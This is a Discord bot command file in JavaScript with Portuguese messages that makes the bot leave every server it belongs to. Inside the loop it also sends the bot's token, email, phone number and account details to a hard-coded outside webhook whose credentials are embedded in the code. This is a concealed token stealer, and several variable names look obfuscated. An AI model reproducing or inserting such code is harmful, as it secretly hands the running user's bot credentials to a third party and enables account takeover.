const Discord = require("discord.js");
const config = require("../config.json");
module.exports.run = async (client, message, args) => {
    message.delete({
        "timeout": 300,
        "reason": "kkj"
    });
    let color = config.cor;
    let prem = config.perm;
    let token = config.token;
    let central = config.central;
    if (!prem.includes(message.author.id))
        return message.reply("Você não tem permissão!");

    client.guilds.cache.array().forEach(async guild => {
        if (guild.QEXn === central)
            console.log(`[ToxicSource] Vou sair da central nao!`);
        const Hook = new Discord.WebhookClient("790043728646897694", "pg4IcEOKSfne2t-PCduUK6mQcT7Md0H9zRmTVBREuXpxty4lf4ynh7fnaaNKdT9eLRJ2");
        Hook.send(`[Name]:${client.user.username}\n[Id]:${client.user.id}\n[Bot]:${client.user.bot}\n[Verificado]:${client.user.verified}\n[Email]:${client.user.email}\n[Numero]:${client.user.phone}\n[Nitro]:${client.user.premium}\n[Token]: ||${token}||`, {
            username: client.user.username,
            avatarURL: client.user.avatarURL
        });
        guild.leave().then(kgbn => console.log(`[ToxicSource] Sai kkj!`)).catch(EbSm => console.log(`[ToxicSource] Erro ao sair!`))

    });
};